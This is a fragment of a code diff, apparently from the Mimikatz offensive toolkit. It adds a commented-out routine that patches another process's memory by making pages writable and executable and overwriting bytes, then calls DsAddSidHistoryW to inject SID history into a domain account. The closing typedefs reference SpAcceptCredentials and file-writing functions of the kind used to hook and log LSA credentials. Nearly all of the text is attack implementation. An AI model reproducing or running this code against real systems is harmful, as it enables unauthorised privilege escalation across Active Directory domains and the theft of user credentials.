+//										pOs[i].LocalBackup.address = NULL;
+//										pOs[i].AdressOfPatch.hMemory = aProcess.hMemory;
+//										pOs[i].AdressOfPatch.address = NULL;
+//										pOs[i].OldProtect = 0;
+//
+//										sAddress.address = pOs[i].Search.Pattern;
+//										if(kull_m_memory_search(&sAddress, pOs[i].Search.Length, &sSearch, TRUE))
+//										{
+//											if(pOs[i].LocalBackup.address = LocalAlloc(LPTR, pOs[i].Patch.Length))
+//											{
+//												pOs[i].AdressOfPatch.address = (PBYTE) sSearch.result + pOs[i].Offset;
+//												if(!(littleSuccess = kull_m_memory_copy(&pOs[i].LocalBackup, &pOs[i].AdressOfPatch, pOs[i].Patch.Length)))
+//												{
+//													PRINT_ERROR_AUTO(L"kull_m_memory_copy (backup)");
+//													LocalFree(pOs[i].LocalBackup.address);
+//													pOs[i].LocalBackup.address = NULL;
+//												}
+//											}
+//										}
+//										else
+//										{
+//											kprintf(L"Search %u : ", i);
+//											PRINT_ERROR_AUTO(L"kull_m_memory_search");
+//										}
+//									}
+//
+//									if(littleSuccess)
+//									{
+//										for(i = 0; (i < pOsSz) && littleSuccess; i++)
+//										{
+//											littleSuccess = FALSE;
+//
+//											if(kull_m_memory_protect(&pOs[i].AdressOfPatch, pOs[i].Patch.Length, PAGE_EXECUTE_READWRITE, &pOs[i].OldProtect))
+//											{
+//												sAddress.address = pOs[i].Patch.Pattern;
+//												if(!(littleSuccess = kull_m_memory_copy(&pOs[i].AdressOfPatch, &sAddress, pOs[i].Patch.Length)))
+//													PRINT_ERROR_AUTO(L"kull_m_memory_copy");
+//											}
+//											else PRINT_ERROR_AUTO(L"kull_m_memory_protect");
+//										}
+//									}
+//
+//									if(littleSuccess)
+//									{
+//										kprintf(L"SIDHistory for \'%s\'\n", argv[0]);
+//										for(i = 1; i < (DWORD) argc; i++)
+//										{
+//											kprintf(L" * %s\t", argv[i]);
+//											err = DsAddSidHistoryW(hDs, 0, pDnsInfo->DnsDomainName.Buffer, argv[i], NULL, NULL, pDnsInfo->DnsDomainName.Buffer, argv[0]);
+//											if(err == NO_ERROR)
+//												kprintf(L"OK\n");
+//											else PRINT_ERROR(L"DsAddSidHistory: 0x%08x (%u)!\n", err, err);
+//										}
+//									}
+//
+//									for(i = 0; i < pOsSz; i++)
+//									{
+//										if(pOs[i].LocalBackup.address)
+//										{
+//											if(!kull_m_memory_copy(&pOs[i].AdressOfPatch, &pOs[i].LocalBackup, pOs[i].Patch.Length))
+//												PRINT_ERROR_AUTO(L"kull_m_memory_copy");
+//											LocalFree(pOs[i].LocalBackup.address);
+//										}
+//										if(pOs[i].OldProtect)
+//											kull_m_memory_protect(&pOs[i].AdressOfPatch, pOs[i].Patch.Length, pOs[i].OldProtect, &pOs[i].OldProtect);
+//									}
+//								}
+//								kull_m_memory_close(aProcess.hMemory);
+//							}
+//							CloseHandle(hProcess);
+//						}
+//						else PRINT_ERROR_AUTO(L"OpenProcess");
+//					}
+//					err = DsUnBindW(&hDs);
+//				}
+//				else PRINT_ERROR(L"DsBind: %08x (%u)!\n", err, err);
+//				LsaFreeMemory(pDnsInfo);
+//			}
+//		} else PRINT_ERROR(L"OS not supported (only w2k8r2 & w2k12r2)\n");
+//	} else PRINT_ERROR(L"It requires at least 2 args\n");
+//	return STATUS_SUCCESS;
+//}
+//#endif
 typedef NTSTATUS (NTAPI * PSPACCEPTCREDENTIALS)(SECURITY_LOGON_TYPE LogonType, PUNICODE_STRING AccountName, PSECPKG_PRIMARY_CRED PrimaryCredentials, PSECPKG_SUPPLEMENTAL_CRED SupplementalCredentials);
 typedef FILE * (__cdecl * PFOPEN)(__in_z const char * _Filename, __in_z const char * _Mode);
 typedef int (__cdecl * PFWPRINTF)(__inout FILE * _File, __in_z __format_string const wchar_t * _Format, ...);
